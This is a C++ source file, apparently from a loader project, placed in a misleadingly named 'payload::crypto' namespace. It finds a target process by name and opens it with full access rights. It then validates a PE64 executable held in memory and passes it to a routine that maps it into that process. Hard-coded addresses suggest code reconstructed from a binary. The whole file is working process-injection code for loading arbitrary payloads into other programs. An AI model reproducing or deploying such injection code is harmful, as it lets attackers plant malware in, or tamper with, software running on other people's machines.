#include "payload/crypto/crypto.hpp"
#include "payload/crypto/crypto_internal.hpp"

#include <windows.h>
#include <tlhelp32.h>

#include <cstddef>
#include <cstdint>
#include <cstring>
#include <iterator>

namespace makima::payload::crypto {





std::uint32_t contains_dma_token(const char* text) noexcept {
    if (text == nullptr) {
        return 0;
    }

    const auto* cursor = reinterpret_cast<const unsigned char*>(text);
    for (;;) {
        const unsigned char first = *cursor;
        if (first == 'D' || first == 'd') {
            const unsigned char second =
                static_cast<unsigned char>(cursor[1] | 0x20U);
            if (second == 'm') {
                const unsigned char third =
                    static_cast<unsigned char>(cursor[2] | 0x20U);
                if (third == 'a') {
                    return 1;
                }
            }
        } else if (first == '\0') {
            return 0;
        }

        ++cursor;
    }
}



std::uint32_t map_payload_into_process(
    char* error_buffer,
    HANDLE process,
    const void* payload,
    std::size_t payload_size) noexcept;




bool find_payload_target_process(
    const wchar_t* module_name,
    std::uint32_t* process_id) noexcept {
    if (process_id != nullptr) *process_id = 0;
    if (module_name == nullptr) return false;
    const HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    bool found = false;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, module_name) == 0) {
                if (process_id != nullptr) *process_id = entry.th32ProcessID;
                found = true;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return found;
}




std::uint32_t inject_payload_into_named_process(
    char* error_buffer,
    std::int64_t payload_address,
    std::int64_t payload_size,
    const char* target_process) noexcept {
    if (error_buffer != nullptr) *error_buffer = '\0';
    if (error_buffer == nullptr || payload_address == 0 || payload_size <= 0 ||
        target_process == nullptr || *target_process == '\0') {
        if (error_buffer != nullptr) {
            static const char* const invalid_arguments =
                detail::allocate_existing_process_invalid_arguments_error(
                    0x1414D95CFll);
            strcpy_s(error_buffer, 0x100, invalid_arguments);
        }
        return 0;
    }

    const auto* payload = reinterpret_cast<const std::byte*>(payload_address);
    if (static_cast<std::size_t>(payload_size) < sizeof(IMAGE_DOS_HEADER)) {
        static const char* const invalid_image =
            detail::allocate_existing_process_invalid_image_error(0x1414D95E2ll);
        strcpy_s(error_buffer, 0x100, invalid_image);
        return 0;
    }
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(payload);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew < 0 ||
        static_cast<std::size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS64) >
            static_cast<std::size_t>(payload_size)) {
        static const char* const invalid_image =
            detail::allocate_existing_process_invalid_image_error(0x1414D95E2ll);
        strcpy_s(error_buffer, 0x100, invalid_image);
        return 0;
    }
    const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
        payload + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        static const char* const invalid_image =
            detail::allocate_existing_process_invalid_image_error(0x1414D95E2ll);
        strcpy_s(error_buffer, 0x100, invalid_image);
        return 0;
    }

    wchar_t target_name[0x104]{};
    if (MultiByteToWideChar(
            CP_UTF8, 0, target_process, -1,
            target_name, static_cast<int>(std::size(target_name))) == 0) {
        static const char* const process_not_found =
            detail::allocate_target_process_not_found_error(0x1414D95F6ll);
        strcpy_s(error_buffer, 0x100, process_not_found);
        return 0;
    }
    std::uint32_t process_id{};
    if (!find_payload_target_process(target_name, &process_id)) {
        static const char* const process_not_found =
            detail::allocate_target_process_not_found_error(0x1414D95F6ll);
        strcpy_s(error_buffer, 0x100, process_not_found);
        return 0;
    }

    const HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (process == nullptr) {
        static const char* const open_failed =
            detail::allocate_target_process_open_error(0x1414D9628ll);
        strcpy_s(error_buffer, 0x100, open_failed);
        return 0;
    }
    const std::uint32_t mapped = map_payload_into_process(
        error_buffer, process, payload, static_cast<std::size_t>(payload_size));
    CloseHandle(process);
    if (mapped == 0 && *error_buffer == '\0') {
        static const char* const resolution_failed =
            detail::allocate_existing_process_api_resolution_error(
                0x1414D9610ll,
                0);
        strcpy_s(error_buffer, 0x100, resolution_failed);
    }
    return mapped;
}

}
